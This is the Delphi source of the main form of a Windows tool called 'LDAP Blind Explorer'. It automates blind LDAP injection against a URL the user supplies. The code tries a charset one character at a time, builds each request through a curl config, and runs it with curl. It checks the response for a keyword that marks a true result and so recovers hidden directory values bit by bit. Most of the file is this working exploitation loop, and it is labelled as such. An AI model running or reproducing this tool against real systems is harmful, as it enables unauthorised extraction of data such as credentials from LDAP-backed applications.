unit untMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, untVariables, untIniSettings, untGenericProcedures, ComCtrls,
  untLog, StdCtrls, untFileVersion, ExtCtrls, LMDCustomComponent, ShellAPI,
  LMDStarter, Htmlview;

type
  TfrmMain = class(TForm)
    StatusBar: TStatusBar;
    Timer1: TTimer;
    LMDS: TLMDStarter;
    PageControl: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    Label1: TLabel;
    Label4: TLabel;
    btnExploit: TButton;
    edtFound: TEdit;
    memCharset: TMemo;
    btnStop: TButton;
    edtURL: TEdit;
    Label5: TLabel;
    edtParameters: TEdit;
    Label6: TLabel;
    radGet: TRadioButton;
    radPost: TRadioButton;
    Label7: TLabel;
    edtKeywordTrue: TEdit;
    Bevel1: TBevel;
    HTMLViewer: THTMLViewer;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Timer1Timer(Sender: TObject);
    procedure btnExploitClick(Sender: TObject);
    procedure btnStopClick(Sender: TObject);
    procedure edtFoundChange(Sender: TObject);
    procedure HTMLViewerHotSpotClick(Sender: TObject; const SRC: string;
      var Handled: Boolean);
  private
    procedure createBatchFile;
    function testPayload(keywordTrue: string): boolean;
    procedure generatePayload(characters: string);
  public
    procedure SetHTTPMethod(param: string);
    function GetHTTPMethod: string;
    function URLEncode(dataIn: string): string;
  end;

var
  frmMain: TfrmMain;

implementation

{$R *.dfm}
{$R resources.RES}

//---------------------------------------------------------on the very beginning

procedure TfrmMain.FormCreate(Sender: TObject);
var
  mySettings: string;
  rs: TResourceStream;  
begin
  Randomize;

  
  //-------- initialize dirs
  currentDir := ExtractFileDir(paramstr(0));
  currentIniSettingsFileName := currentDir + '\' + iniSettingsFileName;
  currentLogFileName := currentDir + '\' + logFileName;

  Application.Title := 'LDAP Blind Explorer (ver.: ' + strBuildInfo + ')';
  caption := Application.Title;

  //-------- start log file
  logOptions := ''; //---can be: [empty], file, file-rewite, screen, both, both-rewrite
  LogInint;
  Log('Application started');

  //-------- enable double-buffering for win controls (remember: TRichEdit is exclusion, so dbl-buff should be switched off for it!)
  EnableDoubleBuffering(frmMain, true);

  pageControl.TabIndex := 0; 

  //-------- load settings form INI
  if paramstr(1) = '' then mySettings := currentIniSettingsFileName else mySettings := paramstr(1);
  if fileexists(mySettings) then LoadSettingsFromIni(mySettings) else
  begin
    application.MessageBox('Where is config file, may I ask you?...', 'Error', MB_OK);
    application.ShowMainForm := false;
    application.Terminate;
  end;

  batchFile := currentDir + '\tmp\run.cmd';
  resultFile := currentDir + '\tmp\result.htm';
  tempCurlConfig := currentDir + '\tmp\tmp_curl.config';
  sourceHTTPHeader := currentDir + '\curl.default_config';
  curlExe := currentDir + '\curl.exe';

  forceDirectories(currentDir + '\tmp');
  createBatchFile;

  //--- load texts from resources
  rs := TResourceStream.Create(hInstance, PChar('license'), RT_RCDATA);
  HTMLViewer.LoadFromStream(rs, '');  

  //Log('Settings loaded');
end;





//-----------------------------------------------------------simple URL encoding
function TfrmMain.URLEncode(dataIn: string): string;
const
  excludeDictionary = '01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>=';
var
  i: integer;
  c: char;

  function isInDictionary(dataIn: char): boolean;
  var i: integer;
  begin
    result := false;
    for i := 1 to length(excludeDictionary) do
    begin
      if excludeDictionary[i] = dataIn then
      begin
        result := true;
        break;
      end;
    end;
  end;
  
begin
  result := '';
  for i := 1 to length(dataIn) do
  begin
    c := dataIn[i];
    if isInDictionary(c) then result := result + c else
    result := result + '%' + inttohex(ord(c), 2);
  end;
end;





procedure TfrmMain.Timer1Timer(Sender: TObject);
begin
   timer1.Enabled := false;
   btnExploit.SetFocus;
end;





//---------------------------------------------------let's create the batch file
procedure TfrmMain.createBatchFile;
var ls: TStringList;
begin
  ls := TStringList.Create;
  ls.Add('del "' + resultFile + '"');
  ls.Add('"' + curlExe + '" --config "' + tempCurlConfig + '" -k >"' + resultFile + '"');
  ls.SaveToFile(batchFile);
  ls.Free;
end;





procedure TfrmMain.edtFoundChange(Sender: TObject);
begin

end;




//--------------------------------------------------------------------set method
procedure TfrmMain.SetHTTPMethod(param: string);
begin
  if param = 'get' then //--- condition "true" enabled
  begin
    radGet.Checked := true;
  end else

  if param = 'post' then //--- condition "false" enabled
  begin
    radPost.Checked := true;
  end;
end;





//--------------------------------------------------------------------get method
function TfrmMain.GetHTTPMethod: string;
begin
  if radGet.Checked = true then result := 'get'
  else if radPost.Checked = true then result := 'post';
end;





procedure TfrmMain.HTMLViewerHotSpotClick(Sender: TObject; const SRC: string;
  var Handled: Boolean);
begin
  ShellExecute(self.WindowHandle, 'open', pchar(HTMLViewer.LinkAttributes.Values['href']), nil, nil, SW_SHOWNORMAL);
end;





//----------------------------------------------------------generate the payload
procedure TfrmMain.generatePayload(characters: string);
var ls: TStringList;
begin
  rf := [rfReplaceAll];
  ls := TStringList.Create;
  ls.LoadFromFile(sourceHTTPHeader);

  if radGet.Checked = true then
  begin
    ls.Text := StringReplace(ls.Text, '<url>', edtURL.Text + '?' + URLEncode(edtParameters.Text), rf);
    ls.Text := StringReplace(ls.Text, '<post>', '', rf);    
  end else

  if radPost.Checked = true then
  begin
    ls.Text := StringReplace(ls.Text, '<url>', edtURL.Text, rf);
    ls.Text := StringReplace(ls.Text, '<post>', '-d "' + URLEncode(edtParameters.Text) +'"', rf);
  end;

  ls.Text := StringReplace(ls.Text, '<characters>', characters, rf);
  ls.SaveToFile(currentDir + '\tmp\' + 'tmp_curl.config');
  ls.Free;
end;





//---------------------------------------------test the payload. if works = true
function TfrmMain.testPayload(keywordTrue: string): boolean;
var ls: TStringList;
begin
  if fileExists(currentDir + '\tmp\' + 'tmp_curl.config') then
  begin
    LMDS.Command := currentDir + '\tmp\run.cmd';
    LMDS.Execute;

    ls := TStringList.Create;
    ls.LoadFromFile(currentDir + '\tmp\result.htm');
    if pos(keywordTrue, ls.Text) > 0 then result := true;
    ls.Free;
  end;
end;





//-----------------------------------------------------------------------exploit
procedure TfrmMain.btnExploitClick(Sender: TObject);
var i, keyPos, counter: integer;
    s: string;
    matchFound: boolean;
begin
  btnExploit.Enabled := false;
  btnStop.Enabled := true;

  main_charset := trim(memCharset.Text);
  test_string := '';

  global_stop := false;

  repeat
    counter := 0;

    //--- check all characters from the charset for the current position
    for keyPos := 1 to length(main_charset) do
    begin
      matchFound := false;
      
      s := copy(main_charset, keyPos, 1);
      generatePayload(test_string + s);
      edtFound.Text := test_string + s;
      StatusBar.Panels[0].Text := 'pos: ' + inttostr(length(edtFound.Text));
      application.ProcessMessages;

      //--- the exploitation is suddenly interrupted (1)
      if global_stop then
      begin
        btnExploit.Enabled := true;
        btnStop.Enabled := false;
        exit;
      end;

      matchFound := testPayload(edtKeywordTrue.Text);
      if matchFound = true then
      begin
        test_string := test_string + s;
        edtFound.Text := test_string;

        //--- the exploitation is suddenly interrupted (2)
        if global_stop then
        begin
          btnExploit.Enabled := true;
          btnStop.Enabled := false;
          exit;
        end;

        //--- some delay
        application.ProcessMessages;
        sleep(100);
        break;
      end;

      counter := counter + 1;
    end;

  until matchFound = false;

  edtFound.Text := copy(edtFound.Text, 1, length(edtFound.Text) - 1);
  
  btnExploit.Enabled := true;
  btnStop.Enabled := false;
end;




//-------------------------------------------------------------stop exploitation
procedure TfrmMain.btnStopClick(Sender: TObject);
begin
  global_stop := true;
end;





//---------------------------------------------------------------on the very end
procedure TfrmMain.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  SaveSettingsToIni(currentIniSettingsFileName);
//  Log('Application closed');
//  Log('');
end;







end.

